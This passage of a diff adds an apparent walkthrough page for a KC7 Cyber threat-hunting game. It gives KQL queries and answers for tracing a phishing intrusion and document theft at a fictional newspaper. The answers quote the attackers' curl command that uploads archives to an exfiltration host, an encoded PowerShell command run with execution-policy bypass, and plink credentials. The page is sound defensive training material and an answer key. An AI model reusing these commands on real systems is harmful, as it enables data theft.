+                <li><code>net view</code>: <quote>Displays a list of domains, computers, or resources that are being shared by the specified computer. Used without parameters, net view displays a list of computers in your current domain.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576(v=ws.11)">official Windows Commands documentation</a>.</li>
+              </ol>
+            </div>
+          </section>
+
+          <section class="question-card" id="question46">
+            <h4>Q26- Do you think we can safely stop our investigation here? (yes/no)</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>no</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Further investigation on Sonia's machine doesn't show anything else of interest. The threat actors were interested in someone else.</p>
+            </div>
+          </section>
+        </section><!--third section-->
+
+        <!--fourth section-->
+        <section id="section4">
+          <h3>Section 4 - A Scandal</h3>
+          <section class="question-card" id="question47">
+            <h4>Q1 - How many total emails were sent by this email sender to users at The Valdorian Times?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Email
+| where sender == "valdorias_best_recruiter@gmail.com"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>18</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The question tells you of another suspicious email address: <code>valdorias_best_recruiter@gmail.com</code></p><p>Which did not appear in our previous queries. It should be noted that appending <code>or reply_to == "valdorias_best_recruiter@gmail.com"</code> to the above query shows that some emails were sent from the previous suspicious email address (<code>newspaper_jobs@gmail.com</code>) but with the <code>reply_to</code> field set to the new email address. If the game had never explicitly told us to check <code>valdorias_best_recruiter@gmail.com</code>, then a query such as...</p>
+<pre><code>Email
+| where sender == "newspaper_jobs@gmail.com" or reply_to == "newspaper_jobs@gmail.com"</code></pre>
+    <p>...would have shown emails sent from <code>valdorias_best_recruiter@gmail.com</code> but with the other email address as the reply to. This would have allowed us to uncover this other malicious email address. Then we can do a query for emails where <code>valdorias_best_recruiter@gmail.com</code> was the sender especifically.</p>
+    <p>Just something to keep in mind for future cases.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question48">
+            <h4>Q2 - When did valdorias_best_recruiter@gmail.com send an email to Ronnie McLovin?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-10T08:48:16Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>This is one question where you do need to visually scan the logs (since we're looking at everyone in Valdorian Times who got sent these emails for leads). Of course, you could also jump ahead and narrow it down to Ronnie McLovin from the get-go, since the malicious article came from her account, she is adamant it's not her work, and we already have evidence of threat actors taking over Valdorian Times computers.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question49">
+            <h4>Q3 - What domain was in the link from that email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>promotionrecruit.org</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Download link to a file named Editorial_J0b_Openings_2024.docx</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question50">
+            <h4>Q4 - What was the subject of that email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>[EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question51">
+            <h4>Q5 - When did Ronnie click on the link in the email from <code>valdorias_best_recruiter@gmail.com</code>?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct ip_addr
+| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
+| where url contains "promotionrecruit.org"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-10T08:55:07Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question52">
+            <h4>Q6 - What was the name of the .docx file that was downloaded to Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Editorial_J0b_Openings_2024.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question53">
+            <h4>Q7 - When was this docx file downloaded?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup FileCreationEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-10T08:55:07Z)
+//if we look for the timestamp (using the time we know she clicked on the link) we can see any other file creation events (such as, say, payloads being dropped) immediately after the file got downloaded</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-10T08:55:17Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question54">
+            <h4>Q8 - When was the .ps1 file dropped to Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-10T08:55:51Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question55">
+            <h4>Q9 - What IP address was used with plink on Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where process_commandline contains "plink"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>168.57.191.100</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The plink tunnel was created on 2024-01-11T03:08:12Z...</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question56">
+            <h4>Q10 - What username was used with plink on Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>$had0w</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question57">
+            <h4>Q11 - What password was used with plink on Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>thruthW!llS3tUfree</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question58">
+            <h4>Q12 - How many discovery commands were run on Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-10T08:55:07Z)
+//the discovery commands occur before the Plink tunnel is established... this seems to be a game error</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>5</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Same five as before: <code>whoami</code>, <code>ipconfig</code>, <code>arp -a</code>, <code>tasklist /svc</code>, <code>net view</code></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question59">
+            <h4>Q13 - What is Ronnie's IP address?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct ip_addr
+| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
+| where url contains "fakestory.docx"
+//this jumps ahead a little bit, but Ronnie's IP is shown in the table</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>10.10.0.19</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The investigation changes; an investigative buddy of yours notes a file named fakestory.docx being downloaded from a suspicious domain.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question60">
+            <h4>Q14 - What is the full URL fakestory.docx was downloaded from?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>https://hire-recruit.org/files/fakescandal/2024/fakestory.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question61">
+            <h4>Q15 - What is Ronnie's hostname?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup FileCreationEvents on $left.hostname == $right.hostname
+| where filename == "fakestory.docx"
+//also jumps ahead a little bit</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>A37A-DESKTOP</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question62">
+            <h4>Q16 - What is the sha256 hash of fakestory.docx on Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question63">
+            <h4>Q17 - When was fakestory.docx created on Ronnie's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-31T09:47:51Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question64">
+            <h4>Q18 - What is the new path for the document?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-31T09:47:51Z)</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>C:\Users\romclovin\Documents\OpEdFinal_to_print.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Ronnie doesn't ever recall downloading that file or visiting the domain. It was probably done by the attackers remotely, using Ronnie's computer. The file was shortly after moved and renamed using the <code>move</code> command.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question65">
+            <h4>Q19 - When was this command executed to rename and move the file?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-31T10:26:20Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question66">
+            <h4>Q20 - When was OpEdFinal_to_print.docx emailed from Ronnie's account to Clark Kent?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-31T11:11:12Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>While you could run a query, the best would be to have jotted it down somewhere back in <a href="#question17">S2 Q5</a>. Notes are important!</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question67">
+            <h4>Q21 - How many minutes elapsed between when the file was moved/renamed on Ronnie machine and when the email was sent to Clark Kent?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>print datetime_diff('minute', datetime(2024-01-31T10:26:20Z), datetime(2024-01-31T11:11:12Z))
+// because I'm not finger-counting this</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>44</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The query returns 45 minutes but the correct answer is 44. This is an error in the game.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question68">
+            <h4>Q22 - What was the subject line of this email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>See <a href="#question17">S2 Q5</a>. You did write it down, didn't you?</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question69">
+            <h4>Q23 - Do you think this is the only thing the attackers did on Ronnie's machine? (yes/no)</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>no</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question70">
+            <h4>Q24 - What is the domain mentioned in this alert?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>hirerecruit.com</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>In this question, Ronnie shows an alert she received from a dark web monitoring service she uses. This screenshot contains some relevant information, such as a date (2024-02-04) and the domain that is selling her information. Said information? "dank memes".</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question71">
+            <h4>Q25 - How many total commands were run in this timeframe?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>//this is a modified form of KC7 Cyber's suggested query :-)
+//the timestamp range is provided
+Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp between (datetime(2024-01-21 07:00:00) .. datetime(2024-01-21 12:00:00))
+| order by timestamp asc //by default, queries are ordered like this; this query introduces the "order by" query. Try it with different columns sometime ;-)</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>There's an odd inconsistency in this case regarding dates; a sample incident report you're shown at the end of the case says that Clark Kent got the malicious email on Jan. 21st; in the actual database it's Jan. 31st. This date range is for Jan. 21st and the game acts as it's a date we've worked with before... Details, details.</p>
+              <p>Onto the commands:</p>
+              <ol>
+                <li><code>C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc</code></li>
+                <li><code>C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs"</code>
+                  <p>The attacker obfuscates the command by encoding it in base64. Decoded, it's <code>Invoke-WmiMethod -ComputerName $Server -Class CCM_SoftwareUpdatesManager -Name InstallUpdates - ArgumentList (, $PendingUpdateList) -Namespace root[&ccm&]clientsdk | Out-Null</code>.</p></li>
+              </ol>
+            </div>
+          </section>
+
+          <section class="question-card" id="question72">
+            <h4>Q26 - What is the name of the .7z file that contains the stolen memes?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Ronnie McLovin"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-31)
+//this shows all relevant events from the day the file was renamed onwards</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>DankMemes.7z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question73">
+            <h4>Q27 - What is the name of the .7z file that contains files stolen from Ronnie's Documents folder?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>MyStolenDataFromDocuments.7z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The command adds all .docx files in Ronnie's Documents folder to a 7zip archive. The archive is in that same folder.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question74">
+            <h4>Q28 - What is the name of the .7z file that contains files stolen from Ronnie's Desktop folder?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>MyStolenDataFromDesktop.7z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The command adds all .docx files in Ronnie's desktop to a 7zip archive located in the Documents folder.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question75">
+            <h4>Q29 - What is the password the attackers used to encrypt all of the .7z files?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>thruthW!llS3tUfree</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>This is the same password they used for plink. Also, there's also a command to add all .jpg files in Ronnie's Memes folder (as you do) to a 7zip archive named DankMemes.7z located in the Documents folder. No question asks for this information specifically.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question76">
+            <h4>Q30 - What is the full command the attackers ran to [exfiltrate the data]?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p> This command exfiltrates all 7z archives, including Ronnie's meme collection (as you do).</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question77">
+            <h4>Q31 - What domain was the stolen data uploaded to?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>hirejob.com</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>All three 7zip archives were uploaded to this portal. The command is rather indiscriminate, so if Ronnie happened to have her own 7zip archives there they also got swept up.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question78">
+            <h4>Q32 - Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>ProcessEvents
+| where process_commandline has_all ("curl -F", "hirejob.com")</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>no</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question79">
+            <h4>Q33 - Type "wooo" to receive credit</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>wooo</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>And we're done! KC7 Cyber helpfully provides an example incident report that summarizes your findings.</p>
+              <p>...Or are we?</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question80">
+            <h4>Q34 - Type "shadows" to finish this module. Stay tuned for the next module to learn more about what's lurking in the shadows 😱</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>shadows</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The player receives a mysterious email from <code>newspaper_jobs@gmail.com</code>, taunting with "you may think you found us[,] but you've got so much to learn". Tune in for the next episode...</p>
+            </div>
+          </section>
+        </section><!--fourth section-->
+      </article>
+    </main>
+    <a class="skip" href="#page-navigation">Return to page navigation</a>
+    <footer>
+      <p>Made with vanilla HTML + CSS by shoutvoid</p>
+      <address>
+        <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
+        <a href="https://github.com/ShoutVoid">GitHub</a>
+        <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
+        <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
+      </address>
+    </footer>
+  </body>
+</html>
+<!--
+<section class="question-card" id="questionN">
+  <h4>QN</h4>
+  <div class="kql-query">
+    <h5>Query</h5>
+    <pre><code>KQL Query
+KQL Query
+KQL Query</code></pre>
+  </div>
+  <div class="answer-card">
+    <h5>Answer</h5>
+    <p>This is an answer</p>
+  </div>
+  <div class="comment-card">
+    <h5>Comments</h5>
+    <p>This is a comment on the question</p>
+  </div>
+</section>
+-->
